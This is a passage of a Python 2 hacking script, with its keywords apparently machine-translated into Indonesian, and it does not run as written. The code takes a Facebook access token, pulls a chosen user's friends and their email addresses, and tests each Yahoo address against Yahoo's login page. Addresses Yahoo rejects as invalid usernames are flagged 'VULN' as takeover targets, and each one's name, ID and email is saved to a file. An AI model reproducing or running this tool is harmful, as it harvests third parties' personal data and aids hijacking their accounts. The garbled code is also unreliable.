		waktu . tidur ( 1 )
		keluar ()
	coba :
		os . mkdir ( 'keluar' )
	kecuali  OSError :
		lulus
	os . sistem ( 'jelas' )
	cetak  logo
	mpsh  = []
	jml  =  0
	cetak  42 * " \ 033 [1; 96m ="
	idt  =  raw_input ( " \ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID teman \ 033 [1; 91m: \ 033 [1; 97m" )
	coba :
		jok  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "? access_token =" + toket )
		op  =  json . memuat ( jok . text )
		cetak " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama \ 033 [1; 91m: \ 033 [1; 97m" + op [ "name" ]
	kecuali  KeyError :
		print " \ 033 [1; 96m [!] \ x1b [1; 91mTeman tidak ditemukan"
		raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
		menu ()
	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...' )
	teman  =  permintaan . dapatkan ( 'https://graph.facebook.com/' + idt + '/ teman? access_token =' + toket )
	kimak  =  json . memuat ( teman . teks )
	jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...' )
	cetak ( ' \ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z' )
	cetak  43 * " \ 033 [1; 96m ="
	untuk  w  di  kimak [ 'data' ]:
		jml  + = 1
		mpsh . tambahkan ( jml )
		id  =  w [ 'id' ]
		nama  =  w [ 'name' ]
		links  =  permintaan . dapatkan ( "https://graph.facebook.com/" + id + "? access_token =" + toket )
		z  =  json . memuat ( tautan . teks )
		coba :
		mail  =  z [ 'email' ]
			yahoo  =  ulang . kompilasi ( r '@. *' )
			otw  =  yahoo . cari ( mail ). grup ()
			if  'yahoo.com'  dalam  otw :
				br . buka ( "https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com" )
				br . _factory . is_html  =  Benar
				br . select_form ( nr = 0 )
				br [ "username" ] =  email
				klik  =  br . kirim (). baca ()
				jok  =  re . kompilasi ( r '"messages.ERROR_INVALID_USERNAME">. *' )
				coba :
					pek  =  jok . cari ( klik ). grup ()
				kecuali :
					terus
				jika  '"messages.ERROR_INVALID_USERNAME">'  di  pek :
					cetak ( " \ 033 [1; 96m [✓] \ 033 [1; 92mVULN" )
					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mID    \ 033 [1; 91m: \ 033 [1; 92m" + id )
					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail )
					cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama )
					save  =  open ( 'out / TemanMailVuln.txt' , 'a' )
					simpan . tulis ( "Nama:" +  nama  +  ' \ n '  "ID:" +  id  +  ' \ n '  "Email:" +  mail  +  ' \ n \ n ' )
					simpan . tutup ()
					berhasil . tambahkan ( mail )
		kecuali  KeyError :
			lulus
	cetak  42 * " \ 033 [1; 96m ="
	cetak  ' \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
	print " \ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str ( len ( berhasil ))
	print " \ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / TemanMailVuln.txt"
